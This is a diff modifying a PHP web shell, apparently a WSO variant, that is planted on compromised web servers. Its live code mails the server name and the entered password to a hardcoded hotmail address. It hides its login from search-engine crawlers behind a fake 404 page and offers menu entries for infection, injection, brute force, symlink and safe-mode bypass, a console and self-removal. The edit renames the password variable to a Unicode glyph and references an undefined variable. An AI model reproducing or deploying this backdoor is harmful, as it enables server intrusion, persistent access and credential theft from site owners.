@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mandra0xdz@hotmail.com', 'wso', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$_password = "21232f297a57a5a743894a0e4a801fc3"; //admin
+$▛ = "21232f297a57a5a743894a0e4a801fc3"; //lol
 $_agent = true;
 $_unicode = 'UTF-8';
 $_action = 'Anonymizer';
@@ -39,38 +39,22 @@ if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || in
     $_COOKIE = stripslashes_array($_COOKIE);
 }
 /* (С) 11.2011 oRb */
-if(!empty($_password)) {
-    if(isset($_POST['pass']) && (md5($_POST['pass']) == $_password))
-        prototype(md5($_SERVER['HTTP_HOST']), $_password);
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $_password))
+if(!empty($▛)) {
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
+        prototype(md5($_SERVER['HTTP_HOST']), $▛);
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
         hardLogin();
 }
-if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
-    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$_agent;
+if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
 function hardLogin() {
-		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
-		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-		  header('HTTP/1.0 404 Not Found');
-		  exit;
-		  }
-		}
-		echo "";
-	die("<style>* {margin:0 !important;padding:0 !important;}</style><meta name=robots content=noindex><body><pre><form method=post style='position:absolute !important;'><input type=password name=pass style='background-color:transparent !important;border:none !important;outline:none !important;' required><input type=submit name='watching' value='submit' style='border:none !important;background-color:transparent !important;color:transparent !important;cursor:pointer !important;'></form></pre><iframe name='iframe_id' id='iframe_id' src=" .'//'. $_SERVER['SERVER_NAME'] .'/404'. " onload='document.title=this.contentDocument? this.contentDocument.title : this.contentWindow.document.title;' width=100% height=100% scrolling=auto frameborder=0 style='border:none !important;'></iframe>
-	<script type='text/javascript'>
-	(function(el, w){
-		function loadFunc(e){
-			e = e || w.event;
-			var f = e.target || e.srcElement, fb = f.contentDocument || f.contentWindow.document;
-			document.title = fb.title;
-		}
-		if (w.addEventListener)
-			el.addEventListener('load', loadFunc, false);
-		else if (w.attachEvent)
-			el.attachEvent('onload', loadFunc);
-	})(document.getElementById('iframe_id'), window);
-	</script>
-	<body>");
+    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+        $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+        if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+            header('HTTP/1.0 404 Not Found');
+            exit;
+        }
+    }
+    die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
@@ -239,7 +223,7 @@ function hardHeader() {
 	foreach($charsets as $microsoft)
 		$opt_charsets .= '<option value="'.$microsoft.'" '.($_POST['charset']==$microsoft?'selected':'').'>'.$microsoft.'</option>';
 	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Injector'=>'Injector','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Symlink'=>'Symlink','Bypasser'=>'SafeMode','Safe Mode'=>'Bypass','Anonymizer'=>'Anonymizer','Network'=>'Network');
-	if(!empty($GLOBALS['_password']))
+	if(!empty($GLOBALS['▛']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
 	$menu = '';
